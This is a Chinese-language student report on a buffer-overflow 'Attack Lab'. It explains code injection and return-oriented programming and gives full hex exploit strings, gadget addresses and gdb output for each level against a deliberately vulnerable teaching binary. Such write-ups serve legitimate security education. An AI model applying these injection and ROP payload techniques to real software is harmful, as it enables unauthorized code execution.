# Attack Lab

## 实验目的

理解缓冲区溢出攻击的种类和原理，掌握实施攻击的简单技术，更加深入理解汇编代码和机器码的关系、运行栈的原理等。

## 实验原理

缓冲区溢出攻击有两种：代码注入和使用返回指令进行攻击。

### 代码注入

代码注入的原理为，在运行栈上原本的 return address 上填充目标指令的地址，使得函数执行 `ret` 时跳转到目标代码。目标指令可以是现有的指令，也可以是栈上通过缓冲区填充的二进制指令。后者只能在关闭了只读保护的前提下进行，而且因为需要将指令地址硬编码进入缓冲区，所以需要栈地址固定。

最简单的情况是，不需要执行自定义指令，直接跳转到一个已有的指令。此时，只需要使用字符将缓冲区填满，再将此指令的地址填入 return address 即可：

```text
+----------------------------+
|addr of instruction         | <-- %rsp
+----------------------------+
|                            |
|padding (size of buffer)    |
|                            |
+----------------------------+
```

如果需要执行自定义的指令，情况稍微复杂一点。首先，return address 应该填充第一条自定义指令在栈上的地址，而这条自定义指令的地址只能在运行期确定。幸运的是，如果栈地址是固定的，那么可以通过运行一次程序，使用 debugger 确定栈的地址，并将其填充入 return address。这样，返回时就会跳转到第一条自定义指令，并且顺序执行之后的指令。

一种构造的运行栈如下：

在原来 return address 的高 8 位，填充在执行完自定义指令后跳转的现有指令的地址，并将最后一条自定义指令设置为 `ret`。这样，就可以在执行完自定义指令后，跳转到需要执行的现有指令。

利用一种方法构造的运行栈如下。其中的指令长度不一定为 8，需要紧密排列在一起。额外的 padding 与指令的总大小为缓冲区的总大小。

```text
+----------------------------+
|addr of existing instruction|   <-- %rsp after 'ret'
+----------------------------+
|addr of instruction 1       |   <-- %rsp
+----------------------------+   --+
|instruction 1               |     |
+----------------------------+     |
|instruction 2               |     |
|............................|     |
|instruction n               |     |
+----------------------------+     | size of buffer
|ret                         |     |
+----------------------------+     |
|                            |     |
|padding                     |     |
|                            |     |
+----------------------------+   --+
```

当然，自定义指令的位置可以灵活放置，不过原理都是类似的。

### 利用返回指令

在开启了栈保护的程序中，栈的地址不能静态地确定，而且栈上的指令无法执行，只能通过执行已有指令进行攻击。

这种攻击的基本思路是，在缓冲区上方填充若干个 gadget 的地址，每一个 gadget 都是现有的指令，并以 `c3`，即 `ret` 的机器码结尾。这样，在执行完 gadget 的指令后，栈指针都会指向下一个 gadget 的地址，由此可以连续执行所有 gadget 的指令。

```text
+----------------------------+
|addr of dest instruction    |  <-- %rsp after gadget n
+----------------------------+
|addr of gadget n            |  <-- %rsp after gadget n-1
|............................| 
|addr of gadget 2            |  <-- %rsp after gadget 1
+----------------------------+
|addr of gadget 1            |  <-- %rsp
+----------------------------+
|                            |
|padding                     |
|                            |
+----------------------------+
```

## 实验过程

首先，通过反汇编获取缓冲区的大小。根据 `getbuf` 的汇编代码：

```text
0000000000401804 <getbuf>:
  401804:	48 83 ec 38          	sub    $0x38,%rsp
  401808:	48 89 e7             	mov    %rsp,%rdi
  40180b:	e8 94 02 00 00       	callq  401aa4 <Gets>
  401810:	b8 01 00 00 00       	mov    $0x1,%eax
  401815:	48 83 c4 38          	add    $0x38,%rsp
  401819:	c3                   	retq   
```

我们可以知道，在栈上开辟了 `0x38` 大小的空间，这就是我们需要的缓冲区大小。

### CI - Level 1

这个部分要求跳转到函数 `touch1`。通过反汇编，得到 `touch1` 的地址：

```text
000000000040181a <touch1>:
```

地址为 `0x40181a`。于是，构造以下的输入：

```text
32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
1a 18 40 00 00 00 00 00
```

其中 56 个字节为 padding，将 `0x40181a` 根据小端字节序填充即可。

运行栈情形如下：

```text
+----------------------------+
|addr of touch1              | <-- %rsp
+----------------------------+
|                            |
|padding                     |
|                            |
+----------------------------+
```

### CI - Level 2

这个部分要求跳转到函数 `touch2`，并且需要传递 Cookie 作为参数。我们需要执行自定义的指令，使得 `%rdi` 中的内容为我们的 Cookie。自定义指令如下：

```assembly
movq $0x283db5ea, %rdi
ret
```

使用 `gcc -c`，得到对应的机器码：

```text
0:	48 c7 c7 ea b5 3d 28 	mov    $0x283db5ea,%rdi
7:	c3                   	retq   
```

然后，通过 `gdb` 获取运行栈的地址。在 `getbuf` 的 `ret` 指令处设置断点：

```text
(gdb) b *0x401819
```

在断点处打印 `%rsp` 的值：

```text
Breakpoint 1, 0x0000000000401819 in getbuf () at buf.c:16
(gdb) p $rsp
$1 = (void *) 0x556563b0
```

可以得到，当前栈指针指向的地址为 `0x556563b0`。

使用[实验原理](#实验原理)中的方法，将机器码，以及 `touch2` 的地址填充：

```text
32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
48 c7 c7 ea b5 3d 28    /* movq $0x283db5ea, %rdi */
c3                      /* ret */
a8 63 65 55 00 00 00 00 /* addr of 'movq $0x283db5ea, %rdi' */
48 18 40 00 00 00 00 00 /* addr of touch2 */
```

即可在跳转至 `touch2` 之前，将 Cookie 写入 `%rdi`。

运行栈情形如下：

```text
+--------------------------------+
|addr of touch2                  | <-- %rsp after 'ret'
+--------------------------------+
|addr of 'movq $0x283db5ea, %rdi'| <-- %rsp
+--------------------------------+
|ret | movq $0x283db5ea, %rdi    |
+--------------------------------+
|                                |
|padding                         |
|                                |
+--------------------------------+
```

### CI: Level 3

这个部分要求跳转到函数 `touch3`，并且需要传递 Cookie 字符串的地址作为参数。由于是传地址，我们需要将 Cookie 字符串填充在栈上，并获取栈上此字符串的地址。

我们利用与上一个题目类似的思路将自定义指令填充进缓冲区中。由于 `touch3` 中会开辟栈空间，因此将字符串填充至最低位置，并注意加上 `\0` 作为结尾。然后，将字符串的地址（通过栈指针指向的地址和与其的偏移量确定）写入 `%rdi` 中。

```text
32 38 33 64 62 35 65 61    /* string */
00 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
48 c7 c7 78 63 65 55    /* movq $0x55656378 (addr of string), %rdi */
c3                      /* ret */
a8 63 65 55 00 00 00 00 /* addr of 'movq $0x55656378, %rdi' */
5f 19 40 00 00 00 00 00 /* addr of touch3 */
```

运行栈情形如下：

```text
+------------------------------+
|addr of touch3                |  <-- %rsp after 'ret'
+------------------------------+
|addr of 'movq $283db5ea, %rdi'|  <-- %rsp
+------------------------------+
|ret | movq $283db5ea, %rdi    |
+------------------------------+
|padding                       |
|...                           |
|<cookie>                      |
+------------------------------+
```

### ROP: Level 2

这个部分要求跳转到函数 `touch2`，并且需要传递 Cookie 作为参数。由于不能执行自定义指令，我们需要把 Cookie 编码到输入字符串中，并通过现有指令将这个 Cookie 的值写入 `%rdi` 中。

根据 `start_farm` 和 `mid_farm` 之间的机器码，在 `addval_379` 中找到指令 `58 c3`：

```text
401a16:	8d 87 49 58 c3 42
```

这两个字节的指令可以翻译为：

```text
popq    %rax
ret
```

这样就可以实现将栈上的 Cookie 值保存到 `%rax` 中，同时也可以避免栈上的 Cookie 值作为地址跳转。

另外，我们还需要将 `%rax` 的值移动到 `%rdi` 中。`movq %rax,%rdi` 的机器码为 `48 89 c7`。在机器码中可以找到若干匹配的代码，但只有一个能够正确地返回：

```text
401a0f:	c7 07 48 89 c7 90
401a15:	c3
```

其中 `90` 作为 `nop`，可以视作跳过此指令，因此执行完 `48 89 c7` 后能够执行 `c3` 跳转。

通过以上信息，构造输入如下：

```text
32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
/* 401a16: 8d 87 49 58 c3 42, '58' for 'popq %rax' */
19 1a 40 00 00 00 00 00
/* cookie */
ea b5 3d 28 00 00 00 00
/* 401a0f: c7 07 48 89 c7 90, '48 89 c7' for 'movq %rax, %rdi' */
11 1a 40 00 00 00 00 00
/* addr of touch2 */
48 18 40 00 00 00 00 00
```

运行栈情形如下：

```text
+----------------------------+
|addr of touch2              |  <-- %rsp after 'movq %rax, %rdi'
+----------------------------+
|addr of 'movq %rax, %rdi'   |  <-- %rsp after 'popq %rax'
+----------------------------+
|cookie                      |
+----------------------------+
|addr of 'popq %rax'         |  <-- %rsp
+----------------------------+
|                            |
|padding                     |
|                            |
+----------------------------+
```

### ROP: Level 3

这个部分要求跳转到函数 `touch3`，并且需要传递 Cookie 字符串的地址作为参数。我们需要将字符串编码到输入字符串中，通过指令动态获取 `%rsp` 的值，并根据字符串在缓冲区的位置加上相应的 offset。

先寻找能将 `%rsp` 的值取出来的指令。所有指令中唯一符合要求的为：

```text
401adc:	8d 87 48 89 e0 c3
```

其中的 `48 89 e0` 为 `movq %rsp,%rax` 的机器码。

然后，我们需要将 offset 保存到某个寄存器中。上一题中用到的 `popq %rax` 可以完成这样的功能。

另外，我们需要将 offset 与栈指针的值相加，以计算字符串的地址。代码中有一条现成的（唯一符合要求的）指令：

```assembly
401a3e:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
```

注意到这条指令的作用为 `%rdi` 加上 `%rsi`，于是我们需要将 `%rsp` 的地址和字符串地址偏移量分别存到这两个寄存器中。

另外，代码中还有符合这样的传递链的指令：

```text
%eax -> %ecx -> %edx -> %esi
%rax -> %rdi
```

通过这样的传递链，可以把 `%eax` 的值存到 `%esi`、把 `%rax` 的值存到 `%rdi` 中。注意到 `%rsp` 地址为 64 位，不能存到 32 位寄存器中，因此 `%esi` 储存的值应为偏移量，`%rdi` 储存的值应为地址。

于是，我们的思路如下：

```text
offset -> %rax (offset)
%eax -> %ecx -> %edx -> %esi (offset)
%rsp -> %rax (addr of %rsp)
%rax -> %rdi (addr of %rsp)
%rsi + %rdi -> %rax (addr of string)
%rax -> %rdi (addr of string as param)
```

由此构造输入如下：

```text
32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32
19 1a 40 00 00 00 00 00 /* popq %rax (offset value) */
20 00 00 00 00 00 00 00 /* offset value (0x20) */
ca 1a 40 00 00 00 00 00 /* %eax -> %ecx (0x20) */
0b 1b 40 00 00 00 00 00 /* %ecx -> %edx (0x20) */
51 1a 40 00 00 00 00 00 /* %edx -> %esi (0x20) */
de 1a 40 00 00 00 00 00 /* %rsp -> %rax (addr - 0x20) */
11 1a 40 00 00 00 00 00 /* %rax -> %rdi (addr - 0x20) */
3e 1a 40 00 00 00 00 00 /* %rdi (addr - 0x20) + %rsi (0x20) -> %rax (addr) */
11 1a 40 00 00 00 00 00 /* %rax -> %rdi (addr - 0x20) */
5f 19 40 00 00 00 00 00 /* addr of touch3 */
32 38 33 64 62 35 65 61 /* string */
00
```

运行栈情形如下：

```text
+----------------------------+
|string                      |
+----------------------------+
|addr of touch3              |  <-- %rsp after 'movq %rax, %rdi'
+----------------------------+
|addr of 'movq %rax, %rdi'   |  <-- %rsp after prev instruction
|............................|
|addr of '%eax -> %ecx'      |  <-- %rsp after 'popq %rax'
+----------------------------+
|offset value                |
+----------------------------+
|addr of 'popq %rax'         |  <-- %rsp
+----------------------------+
|                            |
|padding                     |
|                            |
+----------------------------+
```

## 实验总结

实验过程中还是遇到了不少问题。

一方面是对汇编指令的理解不够深入所导致的错误（比如 `%rsp` 在 `ret` 后的变化、返回地址的概念等）。通过这些练习，这些概念已经非常清晰了。

另一方面是对工具的掌握不够熟练，尤其是 `gdb` 调试工具，这导致中间花费了很多时间。当然，通过大量的调试，已经基本掌握它的使用了。

另外，有时候不容易想到简明的方法。比如，在最后一个实验中，一开始并没有想到可以将 offset 编码到输入中，而是尝试利用寄存器的值不断累加：

```text
11 1a 40 00 00 00 00 00 /* %rax -> %rdi (1) */
ca 1a 40 00 00 00 00 00 /* %eax -> %ecx (1) */
0b 1b 40 00 00 00 00 00 /* %ecx -> %edx (1) */
51 1a 40 00 00 00 00 00 /* %edx -> %esi (1) */
3e 1a 40 00 00 00 00 00 /* %rdi + %rsi -> %rax (2) */
11 1a 40 00 00 00 00 00 /* %rax -> %rdi (2) */
ca 1a 40 00 00 00 00 00 /* %eax -> %ecx (2) */
0b 1b 40 00 00 00 00 00 /* %ecx -> %edx (2) */
51 1a 40 00 00 00 00 00 /* %edx -> %esi (2) */
3e 1a 40 00 00 00 00 00 /* %rdi + %rsi -> %rax (4) */
...... (14 lines)
3e 1a 40 00 00 00 00 00 /* %rdi + %rsi -> %rax (32) */
11 1a 40 00 00 00 00 00 /* %rax -> %rdi (32) */
ca 1a 40 00 00 00 00 00 /* %eax -> %ecx (32) */
0b 1b 40 00 00 00 00 00 /* %ecx -> %edx (32) */
51 1a 40 00 00 00 00 00 /* %edx -> %esi (32) */
```

这么多的代码，使用最后的方法，仅仅需要两行。这是一个经验的问题，只有不断积累经验，才能够想到最优的方法。

总的来说，这次实验的收获还是很大的，也在成功 attack 后收获了不小的成就感。